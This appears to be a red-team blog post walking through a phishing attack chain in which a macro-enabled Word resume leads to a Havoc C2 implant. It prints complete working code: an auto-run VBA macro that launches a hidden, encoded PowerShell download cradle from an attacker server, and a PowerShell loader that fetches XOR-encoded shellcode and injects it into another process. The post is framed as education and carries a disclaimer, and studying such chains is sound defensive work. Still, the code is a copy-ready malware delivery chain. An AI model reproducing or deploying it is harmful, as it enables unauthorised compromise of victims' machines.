From Word to Shell

July 5, 2025

Categories: blog, cybersecurity

Tags: Redteam, pentesting, bugbounty, ctf

Introduction

In today’s threat landscape, sophisticated adversaries often leverage social engineering and weaponized documents as their initial attack vector. Understanding how these attacks unfold is crucial for organizations to strengthen their security posture against real-world attack scenarios. By analyzing the tactics, techniques, and procedures (TTPs) of actual threat actors, security professionals can gain invaluable insights into defensive gaps and help build stronger security resilience.

One of the most prevalent initial access methods observed in the wild is phishing campaigns utilizing malicious Microsoft Office documents. These attacks prey on human psychology and the ubiquitous nature of office productivity suites in corporate environments. A seemingly innocent resume or business proposal can quickly become the gateway for sophisticated malware deployment.

In this demonstration, we’ll walk through how a typical adversary attack chain weaponizes everyday documents to establish persistent command and control channels. Our scenario showcases how attackers would leverage:

  1. Initial Payload: A weaponized Word document (Resume.docm) containing an embedded VBA macro
  2. Loader Mechanism: A PowerShell-based loader (loader.ps1) designed to retrieve and execute additional payloads
  3. Encoded Shellcode: XOR-encoded shellcode (demon_encoded.x64.bin) hosted on the attacker’s infrastructure
  4. Command & Control: A Havoc C2 framework providing post-exploitation capabilities

This attack chain demonstrates several key techniques commonly observed in real-world intrusions: macro-enabled document exploitation, fileless execution through PowerShell, payload encoding for evasion, and in-memory shellcode execution to avoid disk-based detection mechanisms.

Disclaimer: This content is intended for educational and authorized security testing purposes only. The techniques demonstrated should only be used in controlled environments with proper authorization.

Let’s dive into the technical implementation of this attack simulation…

Initial Payload: The Trojan Horse

At first glance, our weaponized document appears as an innocent resume the perfect social engineering lure. However, beneath this benign facade lies a sophisticated attack mechanism waiting to be unleashed. This is the digital equivalent of a Trojan horse, designed to exploit the most vulnerable component in any security infrastructure: human trust.

The document leverages Microsoft Word’s macro functionality, a legitimate feature that becomes a powerful attack vector in the wrong hands. When a victim opens the document and enables macros often prompted by social engineering text claiming the document is “protected” or “encrypted” the embedded VBA code springs into action.

Use Alt + F11 to access the VBA editor and examine the macro code hidden within any .docm file.

Macro Activation: The Point of No Return

Once the user clicks “Enable Content,” the malicious macro executes silently in the background. This moment represents the initial compromise the attacker has successfully breached the perimeter and established their first foothold within the target environment.

The macro serves as the catalyst for the entire attack chain, initiating a carefully orchestrated sequence of events that will ultimately result in a fully compromised system under adversarial control.

VBA 

Sub AutoOpen()
    Dim b64 As String
    b64 = "aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIAMAAzAC4AMQAzADAAOgA4ADAAMAAwAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
    Dim cmd As String
    cmd = "powershell -w hidden -nop -enc " & b64
    Shell cmd, vbHide
End Sub

Breaking Down the Malicious Code

Let’s dissect this deceptively simple yet devastating piece of VBA code:

Sub AutoOpen()
This is the entry point that executes automatically when the Word document is opened and macros are enabled. The AutoOpen() function is a built-in Word macro trigger that requires no user interaction beyond the initial “Enable Content” click.

Base64 Encoded Payload
The variable b64 contains a Base64-encoded Unicode string. When decoded, this reveals:

VBA 

iex (New-Object Net.WebClient).DownloadString('http://192.168.203.130:8000/loader.ps1')

PowerShell Execution
The macro constructs a PowerShell command with specific evasion parameters:

  • -w hidden: Runs PowerShell with a hidden window to avoid detection
  • -nop: Disables PowerShell profiles that might contain security restrictions
  • -enc: Executes the Base64-encoded command directly

Silent Execution
Finally, Shell cmd, vbHide launches the PowerShell process invisibly in the background, making the attack completely transparent to the victim.

This elegant yet malicious code demonstrates how attackers can weaponize legitimate Office features to establish initial access with minimal detection risk.

Loader Mechanism & Encoded Shellcode

With the macro successfully executed, the attack chain progresses to its next critical phase. The PowerShell command initiates an HTTP GET request to the attacker’s infrastructure, specifically targeting the loader.ps1 script hosted on 192.168.203.130:8000.

The Cascading Download Chain

Once the victim opens the Word document and activates the macro, a sophisticated multi-stage payload delivery unfolds:

Stage 1: Initial Callback
The compromised system makes an HTTP GET request to retrieve loader.ps1 from the attacker’s web server. This PowerShell script serves as the secondary payload loader, designed to orchestrate the next phase of the attack.

Loader.ps1 

$sc_enc = Invoke-WebRequest -Uri "http://192.168.203.130:8000/demon_encoded.x64.bin" -UseBasicParsing
$xorKey = 0xAA
$shellcode = for ($i = 0; $i -lt $sc_enc.Content.Length; $i++) {
    $sc_enc.Content[$i] -bxor $xorKey
}

$blacklist = @(
    "System", "Idle", "csrss", "wininit", "smss", "winlogon",
    "services", "lsass", "svchost", "fontdrvhost", "dllhost", "sihost"
)

# === Step 3: Filter candidate processes owned by user ===
$myUser = whoami
$candidates = Get-Process | Where-Object {
    $_.MainWindowHandle -ne 0 -and
    $_.ProcessName -notin $blacklist -and
    ($_.Path -ne $null) -and
    ($_.StartInfo -ne $null) -and
    ($_.StartTime -ne $null)
}

if ($candidates.Count -eq 0) {
    $candidates = Get-Process | Where-Object {
        $_.ProcessName -notin $blacklist -and $_.Path -ne $null
    }
}

$targetProc = $candidates | Sort-Object -Property Id | Select-Object -First 1
$targetPID = $targetProc.Id
Write-Host "[*] Selected process: $($targetProc.ProcessName) (PID: $targetPID)"

$signature = @"
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr OpenProcess(UInt32 processAccess, bool bInheritHandle, int processId);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr lpNumberOfBytesWritten);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$kernel32 = Add-Type -MemberDefinition $signature -Name "Kernel32" -Namespace "Win32" -PassThru

$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$PAGE_EXECUTE_READWRITE = 0x40

$hProcess = $kernel32::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPID)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error "[-] Could not open target process (PID: $targetPID)"
    exit
}


$alloc = $kernel32::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shellcode.Length, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
if ($alloc -eq [IntPtr]::Zero) {
    Write-Error "[-] Memory allocation failed"
    exit
}

$written = [UIntPtr]::Zero
$success = $kernel32::WriteProcessMemory($hProcess, $alloc, $shellcode, $shellcode.Length, [ref]$written)
if (-not $success) {
    Write-Error "[-] Failed to write shellcode to process"
    exit
}

$thread = $kernel32::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $alloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($thread -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to create remote thread"
} else {
    Write-Host "[+] Shellcode successfully injected into PID $targetPID ($($targetProc.ProcessName))"
}

Dissecting the PowerShell Loader

Let’s break down each component:

Payload Retrieval & Decoding

Loader.ps1 

$sc_enc = Invoke-WebRequest -Uri "http://192.168.203.130:8000/demon_encoded.x64.bin" -UseBasicParsing
$xorKey = 0xAA
$shellcode = for ($i = 0; $i -lt $sc_enc.Content.Length; $i++) {
    $sc_enc.Content[$i] -bxor $xorKey
}

The script first downloads the XOR-encoded shellcode from the attacker’s server. The -UseBasicParsing flag ensures compatibility across different PowerShell versions. Each byte is then XORed with the key 0xAA to decode the original shellcode.

Process Selection Strategy

Loader.ps1 

$blacklist = @(
    "System", "Idle", "csrss", "wininit", "smss", "winlogon",
    "services", "lsass", "svchost", "fontdrvhost", "dllhost", "sihost"
)

The script implements a sophisticated process selection mechanism by:

  • Blacklisting critical system processes to avoid system instability
  • Prioritizing processes with window handles (indicating user applications)
  • Filtering for user-owned processes to reduce privilege escalation requirements
  • Selecting the lowest PID for consistency and stealth

Windows API Integration

Loader.ps1 

$signature = @"
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr OpenProcess(UInt32 processAccess, bool bInheritHandle, int processId);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr lpNumberOfBytesWritten);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$kernel32 = Add-Type -MemberDefinition $signature -Name "Kernel32" -Namespace "Win32" -PassThru

$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$PAGE_EXECUTE_READWRITE = 0x40

$hProcess = $kernel32::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPID)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error "[-] Could not open target process (PID: $targetPID)"
    exit
}


$alloc = $kernel32::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shellcode.Length, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
if ($alloc -eq [IntPtr]::Zero) {
    Write-Error "[-] Memory allocation failed"
    exit
}

$written = [UIntPtr]::Zero
$success = $kernel32::WriteProcessMemory($hProcess, $alloc, $shellcode, $shellcode.Length, [ref]$written)
if (-not $success) {
    Write-Error "[-] Failed to write shellcode to process"
    exit
}

$thread = $kernel32::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $alloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($thread -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to create remote thread"
} else {
    Write-Host "[+] Shellcode successfully injected into PID $targetPID ($($targetProc.ProcessName))"
}

Stage 2: Shellcode Retrieval
The loader script subsequently requests demon_encoded.x64.bin an XOR encoded shellcode payload. This encoding technique serves multiple purposes:

  • Evasion: Bypasses signature-based detection mechanisms
  • Obfuscation: Hides the true nature of the payload during transit
  • Anti-Analysis: Complicates reverse engineering efforts

Stage 3: In-Memory Execution
Upon successful retrieval, the loader decodes the XOR-encrypted shellcode and executes it directly in memory, avoiding disk-based artifacts that could trigger security solutions.

Establishing Command & Control

The decoded shellcode establishes a reverse connection back to the attacker’s Havoc C2 framework, completing the initial compromise phase. This connection provides the adversary with:

  • Remote Command Execution: Full shell access to the compromised system
  • Persistence Mechanisms: Ability to maintain long-term access
  • Lateral Movement: Capability to expand access within the network
  • Data Exfiltration: Channels for stealing sensitive information

This multi-stage approach demonstrates the sophistication of modern attack chains, where each component serves a specific purpose in achieving the ultimate objective: establishing persistent, covert access to the target environment.
